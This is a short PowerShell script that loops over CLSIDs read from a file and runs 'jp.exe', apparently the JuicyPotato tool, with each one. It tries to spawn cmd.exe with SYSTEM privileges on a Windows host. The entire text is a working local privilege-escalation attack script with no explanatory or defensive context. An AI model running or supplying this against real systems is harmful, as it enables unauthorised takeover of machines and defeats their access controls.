
foreach($line in Get-Content .\guids.txt)
{
    $guid = $line.Trim().Trim('{','}')

    $command = ".\jp.exe -t * -p c:\windows\system32\cmd.exe -l 1337 -c " + $guid
    echo $command

    Invoke-Expression -Command $command
}
